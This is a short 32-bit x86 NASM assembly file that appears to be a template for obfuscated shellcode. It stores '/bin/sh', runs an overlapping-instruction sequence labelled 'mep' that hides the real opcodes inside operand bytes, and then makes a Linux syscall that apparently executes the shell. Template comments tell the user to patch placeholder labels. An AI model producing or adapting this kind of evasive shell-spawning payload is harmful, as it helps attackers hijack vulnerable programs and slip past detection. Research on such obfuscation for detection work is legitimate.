BITS 32
section .data
;ALLOCATE DATA HERE
;Don't forget data for memory access adjustment

	shellpath: db "/bin/sh",0
	shellpathlen: equ $-shellpath

	ebxData: dd 1
	eaxData: dd 1
section .text
	global _start
_start:
;preface

;Change 0xdeadc0de to 'label - 1'
lea esi, [shellpath-1]

;Memory adjustment stuff (Change 0xdeadc0de to according memory access adjusment label)
lea ebx, [ebxData]
add ebx, 0x3fcefe3a
lea eax, [eaxData]
sub eax, 0x0

;jmp mep0 + 0x2

;mep
mep0:
repe test dword [ebx-0x3fcefe3a], 0x89087689
inc esi
or al, 0x66
mov eax, 0xe0c10000
adc [esi-0x48], ah
or eax, [eax]
lea ebx, [esi]
lea ecx, [esi+0x8]
lea edx, [esi+0xc]
int 0x80
mov eax, 1
mov ebx, 0
int 0x80